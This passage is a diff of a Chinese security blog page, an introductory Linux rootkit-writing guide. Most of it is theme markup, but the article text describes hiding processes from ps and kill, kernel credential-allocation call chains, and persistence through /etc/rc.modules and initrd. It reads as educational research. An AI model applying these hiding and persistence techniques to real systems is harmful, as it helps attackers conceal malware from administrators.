class="number">0x1002</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>简单测试一下，可以发现我们很好地完成了进程隐藏的功能：当我们的进程被隐藏之后，<strong>我们无法使用 ps 命令找到她，也无法通过 kill 命令杀死她</strong>，只有当我们将其恢复之后才能正常找到并将其 kill 掉</p>
-<p><img src="https://i.loli.net/2021/07/22/7NYgtqAmRcEIKy1.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/22/7NYgtqAmRcEIKy1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h2 id="Step-II-重分配-PCB-相关内存空间（未完成）"><a href="#Step-II-重分配-PCB-相关内存空间（未完成）" class="headerlink" title="Step-II. 重分配 PCB 相关内存空间（未完成）"></a>Step-II. 重分配 PCB 相关内存空间（未完成）</h2><p>我们简单看一下进程的创建方式：在 Linux 启动时会有一个 init 进程，接下来的进程都是 init 的子进程，故我们接下来阅读 <code>fork</code> 系统调用的源码，观察到如下调用链：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_fork()</span><br><span class="line">	kernel_clone()</span><br><span class="line">		copy_process()</span><br></pre></td></tr></table></figure>
 
@@ -434,7 +557,7 @@
 <blockquote>
 <p>图是偷的，侵删</p>
 </blockquote>
-<p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 </blockquote>
 <p>同样地，在 <code>copy_process()</code> 函数中使用 <code>copy_creds()</code> 分配新的 cred 结构体，阅读内核源码观察到如下调用链：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy_creds()</span><br><span class="line">	prepare_creds()</span><br><span class="line">		kmem_cache_alloc()</span><br></pre></td></tr></table></figure>
@@ -451,423 +574,457 @@
 <h2 id="方法-I-写入-etc-rc-modules"><a href="#方法-I-写入-etc-rc-modules" class="headerlink" title="方法 I. 写入/etc/rc.modules"></a>方法 I. 写入<code>/etc/rc.modules</code></h2><p>这也是大名鼎鼎的 Linux rootkit <code>Raptile</code> 所采用的操作</p>
 <h2 id="方法-II-写入initrd"><a href="#方法-II-写入initrd" class="headerlink" title="方法 II. 写入initrd"></a>方法 II. 写入initrd</h2><h1 id="0x06-用户态进程"><a href="#0x06-用户态进程" class="headerlink" title="0x06.用户态进程"></a>0x06.用户态进程</h1><h2 id="PRE-启动新进程"><a href="#PRE-启动新进程" class="headerlink" title="PRE.启动新进程"></a>PRE.启动新进程</h2><p>可以使用 <code>_wake_up_new_task()</code> 将一个 <code>task_struct</code> 加入运行队列</p>
 
-      </div>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
       
-        <div class="prev-or-next">
-          <div class="post-foot-next">
-            
-              <a href="/2021/06/24/CODE-0X00-A3OS/" target="_self">
-                <i class="iconfont icon-chevronleft"></i>
-                <span>上一页</span>
-              </a>
-            
-          </div>
-          <div class="post-attach">
-            <span class="post-pubtime">
-              <i class="iconfont icon-updatetime" title="更新时间"></i>
-              2021-07-07 08:53:52
-            </span>
-            
-                  <span class="post-categories">
-                    <i class="iconfont icon-bookmark" title="分类"></i>
-                    
-                    <span class="span--category">
-                      <a href="/categories/CODE/" title="CODE">
-                        <b>#</b> CODE
-                      </a>
-                    </span>
-                    
-                  </span>
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CODE/" class="category-chain-item">CODE</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
+      
+        <a href="/tags/ROOTKIT/">#ROOTKIT</a>
+      
+    </div>
+  
+</div>
+
+
               
-                  <span class="post-tags">
-                    <i class="iconfont icon-tags" title="标签"></i>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Linux/" title="Linux">
-                        <b>#</b> Linux
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/Linux-Kernel/" title="Linux Kernel">
-                        <b>#</b> Linux Kernel
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag">
-                      <a href="/tags/ROOTKIT/" title="ROOTKIT">
-                        <b>#</b> ROOTKIT
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-          </div>
-          <div class="post-foot-prev">
-            
-              <a href="/2021/08/03/CVE-0X02-CVE-2017-5123/" target="_self">
-                <span>下一页</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
-          </div>
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【CODE.0x01】简易 Linux Rootkit 编写入门指北</div>
+      <div>http://blog.arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>arttnba3</div>
         </div>
       
-    </div>
-    
-  <div id="btn-catalog" class="btn-catalog">
-    <i class="iconfont icon-catalog"></i>
-  </div>
-  <div class="post-catalog hidden" id="catalog">
-    <div class="title">目录</div>
-    <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%A6%82%E8%BF%B0"><span class="toc-text">0x00.概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84-LKM"><span class="toc-text">0x01. 最简单的 LKM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">0x02.进程权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cred-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">cred 结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95I-%E8%B0%83%E7%94%A8commit-creds-prepare-kernel-cred-NULL"><span class="toc-text">方法I.调用commit_creds(prepare_kernel_cred(NULL))</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95II-%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9-cred-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">方法II.直接修改 cred 结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#current%EF%BC%9ACPU-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E4%BF%9D%E5%AD%98%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B-task-struct-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">current：CPU 局部变量保存当前进程 task_struct 结构体</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F"><span class="toc-text">0x03.模块隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PRE-%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%EF%BC%9Amodule-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">PRE.内核中的内核模块：module 结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-I-x2F-proc-x2F-modules-%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"><span class="toc-text">Step-I. &#x2F;proc&#x2F;modules 信息隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-II-x2F-sys-x2F-module-x2F-%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"><span class="toc-text">Step-II. &#x2F;sys&#x2F;module&#x2F; 信息隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-III-%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="toc-text">Step-III. 文件隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E8%BF%87%E7%A8%8B"><span class="toc-text">文件遍历过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXT4%EF%BC%9A%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">EXT4：（未完成）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ramVFS%EF%BC%9Ad-child-%E9%93%BE%E8%A1%A8%E8%84%B1%E9%93%BE%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-text">ramVFS：d_child 链表脱链隐藏文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x2F-dev-%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="toc-text">&#x2F;dev 设备文件隐藏</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="toc-text">0x04.进程隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-I-%E4%BB%8E-task-struct-%E9%93%BE%E8%A1%A8%E4%B8%8E-pid-%E9%93%BE%E8%A1%A8%E4%B8%AD%E6%91%98%E9%99%A4%E8%BF%9B%E7%A8%8B"><span class="toc-text">Step-I. 从 task_struct 链表与 pid 链表中摘除进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-II-%E9%87%8D%E5%88%86%E9%85%8D-PCB-%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">Step-II. 重分配 PCB 相关内存空间（未完成）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E9%A9%BB%E7%95%99"><span class="toc-text">0x05.驻留</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-I-%E5%86%99%E5%85%A5-etc-rc-modules"><span class="toc-text">方法 I. 写入&#x2F;etc&#x2F;rc.modules</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-II-%E5%86%99%E5%85%A5initrd"><span class="toc-text">方法 II. 写入initrd</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E7%94%A8%E6%88%B7%E6%80%81%E8%BF%9B%E7%A8%8B"><span class="toc-text">0x06.用户态进程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PRE-%E5%90%AF%E5%8A%A8%E6%96%B0%E8%BF%9B%E7%A8%8B"><span class="toc-text">PRE.启动新进程</span></a></li></ol></li></ol>
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年7月7日</div>
+        </div>
       
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
     </div>
+    <div class="license-icon iconfont"></div>
   </div>
 
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/03/CVE-0X02-CVE-2017-5123/" title="【CVE.0x02】CVE-2017-5123 waitid 漏洞复现及简要分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【CVE.0x02】CVE-2017-5123 waitid 漏洞复现及简要分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/24/CODE-0X00-A3OS/" title="【CODE.0x00】从零开始的32位操作系统开发手记">
+                        <span class="hidden-mobile">【CODE.0x00】从零开始的32位操作系统开发手记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
   
-<script src="/js/catalog.js"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
 
 
 
 
     
-      <div class="comments-container">
-        
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
 
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  <!-- 网站运行时间的设置 -->
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+      var now = new Date();
+      function createtime() {
+          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
+          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+      }
+  setInterval("createtime()",250);
+  </script>
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
 
   
-    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
   
+</div>
 
-  <div id="vcomments"></div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    function loadValineSuc() {
-      new Valine({
-        el: '#vcomments',
-        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
-        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
-        placeholder: '说点什么呗...',
-        avatar: 'retro',
-        lang: 'zh-CN'
-      })
-    }
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
   </script>
 
-    <style>
-      .comments-container .v .vempty {
-        display: none!important;
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
-    </style>
-
-
-
-
-      </div>
-    
-  </div>
-
-
-        
-<div class="footer">
-  <div class="social">
-    <ul>
+      var text = subtitle.getAttribute('data-typed-text');
       
-        <li>
-          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
-            <i class="iconfont icon-github"></i>
-          </a>
-        </li>
+        typing(text);
       
-        <li>
-          <a title="email" href="mailto:arttnba@gmail.com">
-            <i class="iconfont icon-envelope"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        </li>
-      
-        <li>
-          <a title="rss" href="/atom.xml">
-            <i class="iconfont icon-rss"></i>
-          </a>
-        </li>
-      
-    </ul>
-  </div>
+    })(window, document);
+  </script>
+
+
+
+
   
-    
-    <div class="footer-more">
-      
-        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
-        
-    </div>
+    <script  src="/js/img-lazyload.js" ></script>
   
-    
-    <div class="footer-more">
-      
-        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
-        
-    </div>
+
+
+
+
   
-</div>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
 
-      </div>
-
-      <div class="tools-bar">
-        <div class="back-to-top tools-bar-item hidden">
-  <a href="javascript: void(0)">
-    <i class="iconfont icon-chevronup"></i>
-  </a>
-</div>
-
-
-<script src="/js/backtotop.js"></script>
-
-
-
-        
-  <div class="search-icon tools-bar-item" id="search-icon">
-    <a href="javascript: void(0)">
-      <i class="iconfont icon-search"></i>
-    </a>
-  </div>
-
-  <div class="search-overlay hidden">
-    <div class="search-content" tabindex="0">
-      <div class="search-title">
-        <span class="search-icon-input">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-search"></i>
-          </a>
-        </span>
-        
-          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
-        
-        <span class="search-close-icon" id="search-close-icon">
-          <a href="javascript: void(0)">
-            <i class="iconfont icon-close"></i>
-          </a>
-        </span>
-      </div>
-      <div class="search-result" id="search-result"></div>
-    </div>
-  </div>
-
-  <script type="text/javascript">
-    var inputArea = document.querySelector("#search-input")
-    var searchOverlayArea = document.querySelector(".search-overlay")
-
-    inputArea.onclick = function() {
-      getSearchFile()
-      this.onclick = null
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
+  });
+</script>
 
-    inputArea.onkeydown = function() {
-      if(event.keyCode == 13)
-        return false
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
     }
-
-    function openOrHideSearchContent() {
-      let isHidden = searchOverlayArea.classList.contains('hidden')
-      if (isHidden) {
-        searchOverlayArea.classList.remove('hidden')
-        document.body.classList.add('hidden')
-        // inputArea.focus()
-      } else {
-        searchOverlayArea.classList.add('hidden')
-        document.body.classList.remove('hidden')
-      }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
     }
-
-    function blurSearchContent(e) {
-      if (e.target === searchOverlayArea) {
-        openOrHideSearchContent()
-      }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
     }
+    window.anchors.add(res.join(', '));
+  });
+</script>
 
-    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
-    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
-    searchOverlayArea.addEventListener("click", blurSearchContent, false)
 
-    var searchFunc = function (path, search_id, content_id) {
-      'use strict';
-      var $input = document.getElementById(search_id);
-      var $resultContent = document.getElementById(content_id);
-      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
-      $.ajax({
-        // 0x01. load xml file
-        url: path,
-        dataType: "xml",
-        success: function (xmlResponse) {
-          // 0x02. parse xml file
-          var datas = $("entry", xmlResponse).map(function () {
-            return {
-              title: $("title", this).text(),
-              content: $("content", this).text(),
-              url: $("url", this).text()
-            };
-          }).get();
-          $resultContent.innerHTML = "";
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
-          $input.addEventListener('input', function () {
-            // 0x03. parse query to keywords list
-            var str = '<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length <= 0) {
-              return;
-            }
-            // 0x04. perform local searching
-            datas.forEach(function (data) {
-              var isMatch = true;
-              var content_index = [];
-              if (!data.title || data.title.trim() === '') {
-                data.title = "Untitled";
-              }
-              var orig_data_title = data.title.trim();
-              var data_title = orig_data_title.toLowerCase();
-              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
-              var data_content = orig_data_content.toLowerCase();
-              var data_url = data.url;
-              var index_title = -1;
-              var index_content = -1;
-              var first_occur = -1;
-              // only match artiles with not empty contents
-              if (data_content !== '') {
-                keywords.forEach(function (keyword, i) {
-                  index_title = data_title.indexOf(keyword);
-                  index_content = data_content.indexOf(keyword);
 
-                  if (index_title < 0 && index_content < 0) {
-                    isMatch = false;
-                  } else {
-                    if (index_content < 0) {
-                      index_content = 0;
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
                     }
-                    if (i == 0) {
-                      first_occur = index_content;
-                    }
-                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
-                  }
-                });
-              } else {
-                isMatch = false;
-              }
-              // 0x05. show search results
-              if (isMatch) {
-                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
-                var content = orig_data_content;
-                if (first_occur >= 0) {
-                  // cut out 100 characters
-                  var start = first_occur - 20;
-                  var end = first_occur + 80;
-
-                  if (start < 0) {
-                    start = 0;
-                  }
-
-                  if (start == 0) {
-                    end = 100;
-                  }
-
-                  if (end > content.length) {
-                    end = content.length;
-                  }
-
-                  var match_content = content.substr(start, end);
-
-                  // highlight all keywords
-                  keywords.forEach(function (keyword) {
-                    var regS = new RegExp(keyword, "gi");
-                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                   });
-
-                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
-                }
-                str += "</li>";
+                }, '', false]
               }
-            });
-            str += "</ul>";
-            if (str.indexOf('<li>') === -1) {
-              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
             }
-            $resultContent.innerHTML = str;
-          });
-        },
-        error: function(xhr, status, error) {
-          $resultContent.innerHTML = ""
-          if (xhr.status === 404) {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
-          } else {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
-          }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
         }
-      });
-      $(document).on('click', '#search-close-icon', function() {
-        $('#search-input').val('');
-        $('#search-result').html('');
-      });
-    }
+      </script>
+    
 
-    var getSearchFile = function() {
-        var path = "/search.xml";
-        searchFunc(path, 'search-input', 'search-result');
-    }
-  </script>
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
 
-        
-  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
-    <a href="javascript: void(0)">
-      <i id="theme-icon" class="iconfont icon-moon"></i>
-    </a>
-  </div>
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
 
   
-<script src="/js/colorscheme.js"></script>
 
-
-
-
-
-        
-  
-    <div class="share-icon tools-bar-item">
-      <a href="javascript: void(0)" id="share-icon">
-        <i class="iconfont iconshare"></i>
-      </a>
-      <div class="share-content hidden">
-        
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CODE.0x01%E3%80%91%E7%AE%80%E6%98%93%20Linux%20Rootkit%20%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F07%2F07%2FCODE-0X01-ROOTKIT%2F + '" target="_blank" title="Twitter">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        
-        
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/" target="_blank" title="Facebook">
-            <i class="iconfont icon-facebooksquare"></i>
-          </a>
-        
-      </div>
-    </div>
-  
-  
-<script src="/js/shares.js"></script>
-
-
-
-      </div>
-    </div>
-  </body>
+  <noscript>
